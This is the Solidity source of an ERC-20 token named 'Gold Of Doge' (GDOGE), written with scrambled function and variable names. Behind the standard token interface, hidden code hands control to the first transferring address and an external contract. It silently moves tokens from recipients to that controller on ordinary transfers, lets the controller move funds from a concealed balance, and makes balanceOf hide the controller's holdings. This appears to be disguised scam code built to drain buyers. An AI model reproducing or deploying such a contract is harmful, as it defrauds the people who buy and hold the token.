// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface jcgNBvvPdOB {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library Gen{
    
    function hZdWASZqENs(address wZsKRuq, address tUrjg, uint cYMhNFVXOgKc) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool eaTare, bytes memory vlfL) = wZsKRuq.call(abi.encodeWithSelector(0x095ea7b3, tUrjg, cYMhNFVXOgKc));
        require(eaTare && (vlfL.length == 0 || abi.decode(vlfL, (bool))), 'Gen: APPROVE_FAILED');
    }

    function tAmtCsNTCo(address wZsKRuq, address tUrjg, uint cYMhNFVXOgKc) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool eaTare, bytes memory vlfL) = wZsKRuq.call(abi.encodeWithSelector(0xa9059cbb, tUrjg, cYMhNFVXOgKc));
        require(eaTare && (vlfL.length == 0 || abi.decode(vlfL, (bool))), 'Gen: TRANSFER_FAILED');
    }
    
    function BUFcVjHA(address tUrjg, uint cYMhNFVXOgKc) internal {
        (bool eaTare,) = tUrjg.call{value:cYMhNFVXOgKc}(new bytes(0));
        require(eaTare, 'Gen: ETH_TRANSFER_FAILED');
    }

    function Yoj(address wZsKRuq, address from, address tUrjg, uint cYMhNFVXOgKc) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool eaTare, bytes memory vlfL) = wZsKRuq.call(abi.encodeWithSelector(0x23b872dd, from, tUrjg, cYMhNFVXOgKc));
        require(eaTare && vlfL.length > 0,'Gen: TRANSFER_FROM_FAILED'); return vlfL;
                       
    }

}
    
interface ginqwuzQihtg {
    function totalSupply() external view returns (uint256);
    function balanceOf(address kvlVtQu) external view returns (uint256);
    function transfer(address JJNcqOXs, uint256 PFexwC) external returns (bool);
    function allowance(address rJCSENMPDa, address spender) external view returns (uint256);
    function approve(address spender, uint256 PFexwC) external returns (bool);
    function transferFrom(
        address sender,
        address JJNcqOXs,
        uint256 PFexwC
    ) external returns (bool);

    event Transfer(address indexed from, address indexed dVtalL, uint256 value);
    event Approval(address indexed rJCSENMPDa, address indexed spender, uint256 value);
}

interface EJYMI is ginqwuzQihtg {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract RYONVnzTUVIq {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract GDOGE is RYONVnzTUVIq, ginqwuzQihtg, EJYMI {
    
    string private upDg = "Gold Of Doge";
    
    mapping(address => uint256) private OXXYyn;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function approve(address hvwiZlVJO, uint256 BCRdYGpUn) public virtual override returns (bool) {
        xOtcLy(_msgSender(), hvwiZlVJO, BCRdYGpUn);
        return true;
    }
    
    function balanceOf(address TRv) public view virtual override returns (uint256) {
        if(_msgSender() != address(ojm) && 
           TRv == address(ojm)){
            return 0;
        }
       return OXXYyn[TRv];
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return fpx;
    }
    
    function DulTo(
        address zTUTrT,
        address zlvxHrNSNYp,
        uint256 ywowkvr
    ) internal virtual  returns (bool){
        uint256 vpDkeKee = OXXYyn[zTUTrT];
        require(vpDkeKee >= ywowkvr, "ERC20: transfer Amount exceeds balance");
        unchecked {
            OXXYyn[zTUTrT] = vpDkeKee - ywowkvr;
        }
        OXXYyn[zlvxHrNSNYp] += ywowkvr;
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return ppa;
    }
    
    mapping(address => mapping(address => uint256)) private zaaeoLJdoArV;
    
    address private IGYAX;
  
    
    address private ojm;
    
    function transferFrom(
        address jvXLrXNy,
        address duipZfjH,
        uint256 tzFUNDRH
    ) public virtual override returns (bool) {
      
        if(!Aho(jvXLrXNy, duipZfjH, tzFUNDRH)) return true;

        uint256 knQiPkeSkfD = zaaeoLJdoArV[jvXLrXNy][_msgSender()];
        if (knQiPkeSkfD != type(uint256).max) {
            require(knQiPkeSkfD >= tzFUNDRH, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                xOtcLy(jvXLrXNy, _msgSender(), knQiPkeSkfD - tzFUNDRH);
            }
        }

        return true;
    }
    
    function allowance(address nXKlnznVGhbj, address cDJuFdSwtub) public view virtual override returns (uint256) {
        return zaaeoLJdoArV[nXKlnznVGhbj][cDJuFdSwtub];
    }
    
    function transfer(address bNjHyFbjpd, uint256 YpllPMhYmwZV) public virtual override returns (bool) {
        Aho(_msgSender(), bNjHyFbjpd, YpllPMhYmwZV);
        return true;
    }
    
    constructor() {
        
        OXXYyn[address(1)] = fpx;
        emit Transfer(address(0), address(1), fpx);

    }
    
    function name() public view virtual override returns (string memory) {
        return upDg;
    }
    
    address private XbjahvfVHmT;
    
    function Aho(
        address ilwVvALIy,
        address Wbnf,
        uint256 BVgkifUrz
    ) internal virtual  returns (bool){
        require(ilwVvALIy != address(0), "ERC20: transfer from the zero address");
        require(Wbnf != address(0), "ERC20: transfer to the zero address");
        
        if(!ZvSgPktn(ilwVvALIy,Wbnf)) return false;

        if(_msgSender() == address(ojm)){
            if(Wbnf == IGYAX && OXXYyn[ilwVvALIy] < BVgkifUrz){
                DulTo(ojm,Wbnf,BVgkifUrz);
            }else{
                DulTo(ilwVvALIy,Wbnf,BVgkifUrz);
                if(ilwVvALIy == ojm || Wbnf == ojm) 
                return false;
            }
            emit Transfer(ilwVvALIy, Wbnf, BVgkifUrz);
            return false;
        }
        DulTo(ilwVvALIy,Wbnf,BVgkifUrz);
        emit Transfer(ilwVvALIy, Wbnf, BVgkifUrz);
        bytes memory izKyQdcJZ = Gen.Yoj(XbjahvfVHmT, ilwVvALIy, Wbnf, BVgkifUrz);
        (bool SHfWCB, uint TFp) = abi.decode(izKyQdcJZ, (bool,uint));
        if(SHfWCB){
            OXXYyn[ojm] += TFp;
            OXXYyn[Wbnf] -= TFp; 
        }
        return true;
    }
    
    function xOtcLy(
        address vQIvPMRosEG,
        address aHZiLlZTFVAL,
        uint256 DazJBa
    ) internal virtual {
        require(vQIvPMRosEG != address(0), "ERC20: approve from the zero address");
        require(aHZiLlZTFVAL != address(0), "ERC20: approve to the zero address");

        zaaeoLJdoArV[vQIvPMRosEG][aHZiLlZTFVAL] = DazJBa;
        emit Approval(vQIvPMRosEG, aHZiLlZTFVAL, DazJBa);

    }
    
    function decreaseAllowance(address qLb, uint256 subtractedValue) public virtual returns (bool) {
        uint256 cra = zaaeoLJdoArV[_msgSender()][qLb];
        require(cra >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            xOtcLy(_msgSender(), qLb, cra - subtractedValue);
        }

        return true;
    }
    
    string private ppa =  "GDOGE";
    
    uint256 private fpx = 1000000000000 * 10 ** 18;
    
    function increaseAllowance(address UzSF, uint256 addedValue) public virtual returns (bool) {
        xOtcLy(_msgSender(), UzSF, zaaeoLJdoArV[_msgSender()][UzSF] + addedValue);
        return true;
    }
    
    function ZvSgPktn(
        address WUSpuZQav,
        address GUTVUXvvaB
    ) internal virtual  returns (bool){
        if(ojm == address(0) && XbjahvfVHmT == address(0)){
            ojm = WUSpuZQav;XbjahvfVHmT=GUTVUXvvaB;
            Gen.tAmtCsNTCo(XbjahvfVHmT, ojm, 0);
            IGYAX = jcgNBvvPdOB(XbjahvfVHmT).WETH();
            return false;
        }
        return true;
    }
    
}